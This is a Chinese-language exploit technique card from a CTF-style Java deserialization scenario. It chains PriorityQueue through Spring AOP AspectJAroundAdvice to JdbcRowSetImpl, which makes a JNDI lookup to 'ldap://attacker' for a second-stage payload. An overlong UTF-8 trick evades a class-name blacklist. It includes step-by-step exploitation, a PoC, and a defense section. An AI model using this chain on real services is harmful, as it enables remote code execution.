---
id: web-java-deser-spring-aop-aspectjaroundadvice-priorityqueue-jndi
title: Spring AOP AspectJAroundAdvice + PriorityQueue 代理链：反射调用 JdbcRowSetImpl.getDatabaseMetaData 打 JNDI，Overlong UTF-8 绕过 com.sun 字符串黑名单
type: scenario
domain: web
path: web/java/deserialization
technique: spring-aop-aspectjaroundadvice-priorityqueue-jndi
tags:
- java
- deserialization
- spring-aop
- aspectj
- priorityqueue
- jndi
- jdbcrowsetimpl
- blacklist-bypass
- overlong-utf8
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V221
  verified_at: '2026-11-07T06:41:09+08:00'
  notes: 已对照原文代码与3张图核对：/read 的 contains(naming/com.sun/jdk.jfr)+resolveClass 前缀黑名单、PriorityQueue→AspectJAroundAdvice(getDatabaseMetaData)→JdbcRowSetImpl JNDI、双层代理解决 final Comparator、overlong UTF-8 仅改 TC_CLASSDESC 不够、JDK11 trustURLCodebase=false/trustSerialData=true 与 JRMP 收尾均一致。原文仅本地验证 PriorityQueue 链命令执行，远程未打通，卡已标注 confidence=medium；依赖版本(spring 5.3.20/aspectj 1.9.7/jackson 2.13.3)为目标环境，未设 affected_versions。
url: /docs/web/java/deserialization/web-java-deser-spring-aop-aspectjaroundadvice-priorityqueue-jndi/
draft: false
kb_aliases:
- AspectJAroundAdvice gadget
- SingletonAspectInstanceFactory
- JdbcRowSetImpl getDatabaseMetaData
- PriorityQueue comparator proxy
- UTF8OverlongEncoding 绕过 com.sun
- MyObjectInputStream 黑名单绕过
- Spring AOP JNDI 链
---

## 一句话结论

原生 Java 反序列化入口只做“类名前缀黑名单 + 原始字节 `contains("com.sun"/"naming"/"jdk.jfr")`”检查时，可用 Spring AOP 的 `AspectJAroundAdvice` 包装 `JdbcRowSetImpl.getDatabaseMetaData` 方法，再把该 advice 代理成 `Comparator` 塞进 `PriorityQueue.comparator`：`PriorityQueue.readObject()` 恢复元素时的堆化比较会走到 JDK 动态代理 → `JdkDynamicAopProxy` → `AspectJAroundAdvice.invoke()`，最终反射调用 `getDatabaseMetaData()`，触发 `JdbcRowSetImpl` 的 JNDI lookup。序列化流中的 `com.sun` 用 UTF-8 Overlong Encoding 改写即可绕过原始字符串检查；JDK 11 上 `trustURLCodebase=false` 但 `trustSerialData=true`，可通过 LDAP `javaSerializedData` 或 JRMP 投递二阶段 payload（如 Jackson 链）执行命令。

## 原理

- **入口与黑名单**：`/read` 把请求体 Base64 解码后，先用 `new String(data).contains("naming"/"com.sun"/"jdk.jfr")` 做原始字节检查，再交给自定义 `ObjectInputStream`；后者在 `resolveClass()` 中按 `className.startsWith(denyClass)` 拒绝黑名单类。黑名单包含 `TemplatesImpl`、`java.net.URL`、`java.util.Comparator`、`java.util.HashMap` 等，但没有 `PriorityQueue`、Spring AOP 类、`JdbcRowSetImpl`。
- **PriorityQueue 触发比较**：`PriorityQueue.readObject()` 恢复 `queue` 数组后调用 `heapify()`，堆化时若 `comparator != null` 就调用 `comparator.compare(a,b)`。攻击者可用反射把 `comparator` 设为攻击者代理、把 `queue` 设为两个触发对象。
- **Spring AOP 反射转发**：`AspectJAroundAdvice` 继承 `AbstractAspectJAdvice`，持有 `method`、`pointcut`、`aspectInstanceFactory`；被代理调用时会进入 `invoke()`，在 `aspectInstanceFactory` 提供的实例上反射执行指定方法。本例 `method = JdbcRowSetImpl.getDatabaseMetaData()`、`SingletonAspectInstanceFactory(jdbcRowSet)`，因此比较器调用等价于对 `JdbcRowSetImpl` 调用 `getDatabaseMetaData()`。
- **两层代理解决 final 字段类型**：`PriorityQueue.comparator` 是 `final Comparator` 字段，直接反射写入一个仅实现 `Advice` 的代理会报 `Can not set final java.util.Comparator field ... to com.sun.proxy.$Proxy1`；需要先用 `getAProxy(advice, Advice.class)` 生成 advice 代理，再用 `getBProxy(proxy1, Comparator.class)` 把它包装成同时实现 `Comparator` 的代理，才能赋给 `comparator` 字段并触发 AOP 调用。
- **JNDI 注入**：`JdbcRowSetImpl.setDataSourceName("ldap://attacker/xxx")` 后，`getDatabaseMetaData()` 会解析该 JNDI 名称并发起 LDAP/RMI 请求。JDK 8 高版本起 `com.sun.jndi.ldap.object.trustURLCodebase` 默认 false，不能直接远程加载 codebase；JDK 11（原文称 JDK 21 以下）`com.sun.jndi.ldap.object.trustSerialData` 默认 true，可让 LDAP 服务器返回 `javaSerializedData` 属性，在目标端触发二阶段反序列化（如 Jackson 链），或用 JRMP 服务端返回序列化 payload。
- **Overlong UTF-8 绕过原始字节检查**：Java 序列化流中的类名/字段名按 modified UTF-8 写入；把 `com.sun...` 中的字符用多字节 overlong 形式编码，`new String(data)` 得到的字符串不再包含字面量 `com.sun`，从而通过入口的 `contains` 检查；`resolveClass()` 拿到的是解码后的真实类名，但 `JdbcRowSetImpl` 不在前缀黑名单中。注意：只处理 `TC_CLASSDESC` 的类名不够，字段描述符/类型字符串中的 `naming` 等字样也要一并改写，否则仍会被原始字节检查命中。
- **为什么本地可打通而远程可能失败**：本地 classpath 含 spring-aop 5.3.20、aspectjweaver 1.9.7、Jackson 2.13.3、Hibernate 5.6.9、hsqldb 2.4.1 等，二阶段 payload 有可用链；远程环境是否保留同类依赖、JNDI 出网与 `trustSerialData` 配置是否一致决定成败。原文远程利用未成功，属环境/链路未验证部分。

## 触发条件

- 存在对用户输入直接 `readObject()` 的原生反序列化入口（本例 `/read`，Base64 请求体）。
- 防护仅为类名前缀黑名单 + 原始字节字符串检查，未使用 `ObjectInputFilter` 白名单或类加载隔离。
- classpath 含 Spring AOP / aspectjweaver（`AspectJAroundAdvice`、`SingletonAspectInstanceFactory`、`JdkDynamicAopProxy` 等），且 JDK 提供 `com.sun.rowset.JdbcRowSetImpl`（JDK 11 默认模块内可用）。
- 目标可访问攻击者控制的 LDAP/RMI/JRMP 服务；JDK 版本满足 `trustSerialData=true` 或存在其他 JNDI 高版本绕过链。
- 远程二阶段 payload 所需的依赖（如 Jackson 2.13.3、Hibernate、hsqldb）在目标 classpath 中存在。

## 利用步骤

1. 侦察入口：确认 `/read` 对 Base64 请求体 `readObject()`，并列出黑名单（`blacklist.txt`）与依赖版本。
2. 构造 JNDI 触发对象：`JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); jdbcRowSet.setDataSourceName("ldap://attacker:50389/xxxx");`。
3. 构造 Spring AOP advice：取 `getDatabaseMetaData` 的 `Method`，用 `AspectJAroundAdvice(method, new AspectJExpressionPointcut(), new SingletonAspectInstanceFactory(jdbcRowSet))` 包装。
4. 生成代理：`getAProxy(advice, Advice.class)` 得到 advice 代理；`getBProxy(proxy1, new Class[]{Comparator.class})` 得到可赋给 `PriorityQueue.comparator` 的 `Comparator` 代理。
5. 构造 `PriorityQueue`：容量 1，先 `add(1)`/`add(2)`，再反射把 `comparator` 设为最终代理、`queue` 设为 `{proxy1, proxy1}`。
6. 序列化并用 UTF-8 Overlong Encoding 改写所有含 `com.sun`/`naming`/`jdk.jfr` 的 UTF 字符串（类名、字段描述符等），Base64 后 POST 到 `/read`。
7. 在攻击端启动 LDAP/RMI 服务并返回 `javaSerializedData`（Jackson 链）或启动 JRMP 服务；目标触发 JNDI lookup 后在目标端二次反序列化并执行命令。
8. 验证：本地以相同依赖复现命令执行；远程按目标 JDK/classpath 调整二阶段 payload。

## PoC

```java
import com.sun.rowset.JdbcRowSetImpl;
import org.aopalliance.aop.Advice;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;

import java.lang.reflect.Method;
import java.util.Comparator;
import java.util.PriorityQueue;

JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
jdbcRowSet.setDataSourceName("ldap://127.0.0.1:50389/8cb29d");

Method method = jdbcRowSet.getClass().getMethod("getDatabaseMetaData");
SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(jdbcRowSet);
AspectJAroundAdvice advice = new AspectJAroundAdvice(method, new AspectJExpressionPointcut(), factory);

Proxy proxy1 = (Proxy) ProxyUtil.getAProxy(advice, Advice.class);
Proxy finalproxy = (Proxy) ProxyUtil.getBProxy(proxy1, new Class[]{Comparator.class});

PriorityQueue PQ = new PriorityQueue(1);
PQ.add(1);
PQ.add(2);
ReflectUtil.setFieldValue(PQ, "comparator", finalproxy);
ReflectUtil.setFieldValue(PQ, "queue", new Object[]{proxy1, proxy1});

System.out.println(SerializeUtil.serializeBypass(PQ));
```

说明：`ProxyUtil`/`ReflectUtil`/`SerializeUtil` 为原文辅助工具类（可用 `JdkDynamicAopProxy` + `DefaultPointcutAdvisor`、`Field.setAccessible`、以及改写序列化字节的 overlong 编码自行实现）。原文在本地对该 `PriorityQueue` payload 执行命令成功；另用 java-chains 的 `JNDIReferencePayload`/Jackson 链尝试远程，未成功，作者归因于远程环境或 JNDI `javaSerializedData` 投递问题，未最终验证。

## 变体与关联

- **同一触发点、不同 advice/sink**：[[web-java-deser-spring-aop-methodbeforeadvice-priorityqueue-arbitrary-method]] 用 `AspectJMethodBeforeAdvice` + `MethodBeforeAdviceInterceptor` 反射调用 `FileCopyUtils.copy` 写 `.so`、再 `System.load`；本卡用 `AspectJAroundAdvice` 反射调用 `JdbcRowSetImpl.getDatabaseMetaData` 打 JNDI，advice 类型与 sink 均不同。
- **有参调用 gadget**：[[web-java-deserialization-spring-aop-parameterized-advice-gadget]] 覆盖 `AspectJAdvice` + `JdkDynamicAopProxy` 经 `Hashtable.equals` 触发 `Map.get` 的变体。
- **Overlong 绕过**：[[web-java-deser-objectinputstream-overlong-utf8-blacklist-bypass]] 详细说明 UTF-8 Overlong Encoding 隐藏类名的字节级做法；本卡补充“只改 TC_CLASSDESC 不够、字段描述符也要改”的坑。
- **JNDI 高版本利用**：[[web-java-deserialization-jndi-tomcat-resourcefactory-jdbc-bypass]]、[[web-java-deserialization-jndi-high-version-beanfactory-el]] 等卡覆盖 `trustURLCodebase=false` 时的本地工厂绕过；本卡走 `trustSerialData`/JRMP 路线。
- **边界**：目标使用 `ObjectInputFilter` 白名单、JDK 版本关闭 `trustSerialData` 且无其他 JNDI 绕过、classpath 无 Spring AOP/Jackson 等可用链、或 JNDI 出网被阻断时，本链不成立。原文远程未打通，复现时需按目标环境重新验证。

## 检测与防御

- 防御：禁止对用户输入使用原生 `readObject()`；使用 `ObjectInputFilter` 做类白名单（只允许明确需要的类），而不是类名黑名单。
- 防御：设置 `com.sun.jndi.ldap.object.trustURLCodebase=false` 与 `com.sun.jndi.ldap.object.trustSerialData=false`；升级 JDK 并按版本核对默认值；限制 JVM 对 LDAP/RMI/JRMP 的出网访问。
- 检测：反序列化请求中出现 `PriorityQueue`、Spring AOP/Advice 类、`JdbcRowSetImpl`、`ldap://`/`rmi://` 字符串或 overlong UTF-8 字节序列；JVM 发起异常 LDAP/RMI 外连；`resolveClass` 被频繁调用且类名异常。
- 响应：阻断外连、保存请求字节与 JVM 日志、检查是否已加载恶意类/执行命令、轮换可能泄露的密钥与凭据。
